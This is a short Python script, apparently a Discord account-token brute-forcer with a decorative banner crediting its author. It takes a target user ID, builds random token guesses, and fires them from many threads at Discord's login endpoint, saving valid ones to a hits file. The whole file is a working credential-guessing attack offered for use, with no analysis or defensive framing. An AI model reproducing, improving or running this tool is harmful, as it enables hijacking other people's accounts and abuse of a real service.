import base64
import threading
import random
import string
import requests
import time
import colorama
from colorama import Fore
colorama.init()

print(F"{Fore.LIGHTBLUE_EX}. /%%                 /%%            /%%%%%% ")
time.sleep(0.1)
print(F"{Fore.WHITE}.| %%                | %%           /%%__  %%")
time.sleep(0.1)
print(F"{Fore.LIGHTBLUE_EX}.| %%       /%%   /%%| %% /%%%%%%%%| %%  \__/  /%%%%%%   /%%%%%%%")
time.sleep(0.1)
print(F"{Fore.WHITE}.| %%      | %%  | %%| %%|____ /%%/|  %%%%%%  /%%__  %% /%%_____/ ")
time.sleep(0.1)
print(F"{Fore.LIGHTBLUE_EX}.| %%      | %%  | %%| %%   /%%%%/  \____  %%| %%%%%%%%| %%")
time.sleep(0.1)
print(F"{Fore.WHITE}.| %%      | %%  | %%| %%  /%%__/   /%%  \ %%| %%_____/| %%")
time.sleep(0.1)
print(F"{Fore.LIGHTBLUE_EX}.| %%%%%%%%|  %%%%%%/| %% /%%%%%%%%|  %%%%%%/|  %%%%%%%|  %%%%%%%")
time.sleep(0.1)
print(F"{Fore.WHITE}.|________/ \______/ |__/|________/ \______/  \_______/ \_______/")
time.sleep(0.1)
print(F"{Fore.BLUE}Created by kat.#2065")
time.sleep(2)

idtoken = base64.b64encode((input("ID ---> ")).encode("ascii"))
idtoken = str(idtoken)[2:-1]
thrd =  input("Threads ---> ")

def bruhmoment():
    while idtoken == idtoken:
        token = idtoken + '.' + ('').join(random.choices(string.ascii_letters + string.digits, k=4)) + '.'   + ('').join(random.choices(string.ascii_letters + string.digits, k=25))
        header={
            'Authorization': token
        }
        bruh = requests.get('https://discordapp.com/api/v9/auth/login', headers=header)

        if bruh.status_code == 200:
                print(F"{Fore.GREEN}[!] VALID" + ' ' + token)
                print(" ")
                file = open('hits.txt', "a+")
                file.write(F'{token}\n')
        else:
                print(F"{Fore.RED}[!] INVALID" + ' ' + token)
                print(" ")

threads = []

for _ in range(int(thrd)):
    t = threading.Thread(target=bruhmoment)
    t.start()
    threads.append(t)

for thread in threads:
    thread.join()